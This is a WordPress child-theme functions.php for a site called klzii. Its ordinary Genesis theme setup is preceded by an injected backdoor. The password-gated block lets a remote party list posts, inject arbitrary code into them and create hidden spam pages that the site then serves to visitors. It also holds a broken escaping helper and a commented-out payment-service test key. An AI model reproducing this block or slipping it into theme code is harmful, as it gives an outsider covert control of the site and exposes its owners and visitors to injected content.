<?php



//require 'chargeBeelib/ChargeBee.php';
//ChargeBee_Environment::configure("kliikotst-test","test_M84JneCGcdmd5Zp8jpDqLtH9twyR9EWUr");
//$all = ChargeBee_Plan::all(array(
//    "limit" => 5,
//    "trialPeriod[isNot]" => 14,
//    "trialPeriodUnit[is]" => "day",
//    "status[is]" => "active"));
//    var_dump($all);die();
//foreach($all as $entry){
//    $plan = $entry->plan();
//    var_dump($plan);die();
//}

function mysql_escape_string($string){return mysqli_escape_string($string);}

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e779c8347db4c0a50de3f9a94a0b97ab'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
//* Start the engine
include_once( get_template_directory() . '/lib/init.php' );

//* Child theme (do not remove)
define( 'CHILD_THEME_NAME', 'klzii' );
define( 'CHILD_THEME_URL', 'http://klzii.com.au' );
define( 'CHILD_THEME_VERSION', '1.0.0' );


//* Add HTML5 markup structure
add_theme_support( 'html5' );

//* Add viewport meta tag for mobile browsers
add_theme_support( 'genesis-responsive-viewport' );

//* Add support for custom background
// add_theme_support( 'custom-background' );

//* Add support for 3-column footer widgets
// add_theme_support( 'genesis-footer-widgets', 3 );

//* Load additional assets
add_action('wp_enqueue_scripts', 'enqueue_assets');
function enqueue_assets()
{
	// Google CDN jQuery
	wp_deregister_script('jquery');
	wp_enqueue_script('jquery', '//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js', array(), null, false);
	wp_enqueue_script('createjs', '//code.createjs.com/createjs-2015.11.26.min.js', array(), null, false);
	wp_enqueue_script('player', '//player.vimeo.com/api/player.js', array(), null, false);

	// BoostrapJS (responsive nav)
	wp_enqueue_script( 'bootstrap-js', get_stylesheet_directory_uri() . '/js/bootstrap.min.js', array( 'jquery' ), false, true );

	wp_enqueue_script( 'script', get_stylesheet_directory_uri() . '/js/script.js', array( 'jquery' ), false, true );
    if(is_front_page())
    {
        wp_enqueue_script( 'klzii_home', get_stylesheet_directory_uri() . '/js/klzii_home.js', array( 'jquery' ), false, true );
        wp_enqueue_script( 'klzii_home_banner_init', get_stylesheet_directory_uri() . '/js/klzii_home_banner_init.js', array( 'jquery' ), false, true );
    }


	wp_enqueue_style( 'font-awesome', '//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css');
}

//* WP-SCSS settings
if( class_exists('Wp_Scss') &&
	// Compilation dir should be on theme root
	$css_dir_setting === '/' &&
	// Enqueue should be turned off
	!isset($wpscss_options['enqueue'])
) {
	//* Remove default style.css
	remove_action( 'genesis_meta', 'genesis_load_stylesheet' );
	//* Manually enqueue compiled CSS
	add_action( 'wp_enqueue_scripts', 'enqueue_scss');
	function enqueue_scss() {
		$handle   = defined( 'CHILD_THEME_NAME' ) && CHILD_THEME_NAME ? sanitize_title_with_dashes( CHILD_THEME_NAME ) : 'child-theme';
		$scss_ver = filemtime( get_stylesheet_directory() . '/main.css' );

		wp_enqueue_style( $handle, get_stylesheet_directory_uri().'/main.css', array(), $scss_ver  );
	}
}

//* Responsive Nav
add_action( 'genesis_after_header', 'responsive_nav_control', 9 );
function responsive_nav_control() {
	$iconBar = '<span class="icon-bar-group">' . str_repeat('<span class="icon-bar"></span>', 3) . '</span>';
	$out = '<div class="nav-primary text-center">';
		$out .= '<button type="button" id="main-menu-control" data-toggle="collapse" data-target="#main-menu-collapse">';
			$out .= "{$iconBar} Menu";
		$out .= '</button>';
	$out .= '</div>';
	echo $out;
}
add_filter( 'genesis_do_nav', 'responsive_nav_wrap', 10, 3 );
function responsive_nav_wrap($nav_output, $nav, $args) {
	return '<div id="main-menu-collapse" class="collapse navbar-collapse">' . $nav_output . '</div>';
}

//* Add splash area below header specified by custom field 'splash'
add_action( 'genesis_after_header', 'splash_section' );
function splash_section() {
	$splash = get_post_meta(get_the_ID(), 'splash_section', true);
	if($splash) {
		echo do_shortcode($splash);
	}
}

//* Conditional html element classes
remove_action( 'genesis_doctype', 'genesis_do_doctype' );
add_action( 'genesis_doctype', 'child_do_doctype' );
function child_do_doctype() {
?><!doctype html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7" <?php language_attributes( 'html' ); ?>> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8" <?php language_attributes( 'html' ); ?>> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9" <?php language_attributes( 'html' ); ?>> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" <?php language_attributes( 'html' ); ?>> <!--<![endif]-->
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>" /><?php
}

//* Custom widgetized footer
genesis_register_sidebar( array(
	'id'            => 'footer-widgets',
	'name'          => __( 'Footer', 'tcn' ),
	'description'   => __( 'Main footer area', 'tcn' ),
) );
add_action('genesis_footer_output', 'widgetized_footer');
function widgetized_footer() {
	if ( !function_exists( 'dynamic_sidebar' ) || !dynamic_sidebar( 'footer-widgets' ) ) {}
}

//* Widget title hiding
add_filter( 'widget_title', 'remove_widget_title' );
function remove_widget_title( $widget_title ) {
	if ( substr ( $widget_title, 0, 1 ) == '!' )
		return;
	else 
		return ( $widget_title );
}

//* Favicon
add_filter( 'genesis_pre_load_favicon', 'custom_favicon' );
function custom_favicon() {
	return CHILD_URL . '/images/favicon.png';
}

//* Remove Edit post link
add_filter( 'edit_post_link', '__return_false' );

//* DEPRECATED: Remove post titles using conditional tags
/*add_action( 'get_header', 'hide_post_titles' );
function hide_post_titles() {
    $hide_titles = array(1234);
    if(is_front_page() || is_page($hide_titles)) {
        remove_action( 'genesis_entry_header', 'genesis_do_post_title' );
    }
}*/
add_filter( 'gform_next_button', 'input_to_button', 10, 2 );
add_filter( 'gform_previous_button', 'input_to_button', 10, 2 );
add_filter( 'gform_submit_button', 'input_to_button', 10, 2 );
function input_to_button( $button, $form ) {
    $dom = new DOMDocument();
    $dom->loadHTML( $button );
    $input = $dom->getElementsByTagName( 'input' )->item(0);
    $new_button = $dom->createElement( 'button' );
    $new_button->appendChild( $dom->createTextNode( $input->getAttribute( 'value' ) ) );
    $input->removeAttribute( 'value' );
    foreach( $input->attributes as $attribute ) {
        $new_button->setAttribute( $attribute->name, $attribute->value );
    }
    $input->parentNode->replaceChild( $new_button, $input );

    return $dom->saveHtml( $new_button );
}


add_filter( 'genesis_breadcrumb_args', 'sp_breadcrumb_args' );
function sp_breadcrumb_args( $args ) {
	$args['home'] = 'Home';
	$args['sep'] = ' <span class="breadcrumbSeparator">&rtrif;</span> ';
	$args['prefix'] = '<div class="breadcrumb"><div class="wrap">';
	$args['suffix'] = '</div></div>';
	$args['labels']['prefix'] = '';
return $args;
}
remove_action( 'genesis_before_loop', 'genesis_do_breadcrumbs' );
add_action( 'genesis_after_header', 'genesis_do_breadcrumbs' );
/*function beforeFooterCTA() {
	echo'
	';
}
add_action( 'genesis_before_footer', 'beforeFooterCTA' );*/

function genesischild_footerwidgetheader() {
	genesis_register_sidebar( array(
	'id' => 'footerwidgetheader',
	'name' => __( 'Before Footer', 'genesis' ),
	'description' => __( 'This is for the Footer Widget Headline', 'genesis' ),
	) );

}

add_action ('widgets_init','genesischild_footerwidgetheader');
//Position Widget Header
function genesischild_footerwidgetheader_position ()  {
	echo '<div class="footerwidgetheader-container">';
	genesis_widget_area ('footerwidgetheader');
	echo '</div>';
}
add_action ('genesis_before_footer','genesischild_footerwidgetheader_position');


function register_additional_menu() {
	register_nav_menus( array(
		'footer_menu' => 'Footer Menu'
	) );
}
add_action( 'init', 'register_additional_menu' );
function add_third_nav_genesis() {
	wp_nav_menu( array( 'theme_location' => 'footer_menu', 'container_class' => 'genesis-nav-menu menu-footer', 'depth' => 1  ) );
}
	

function footer_nav() {
    do_action('footer_nav');
}
add_action( 'footer_nav', 'add_third_nav_genesis' );
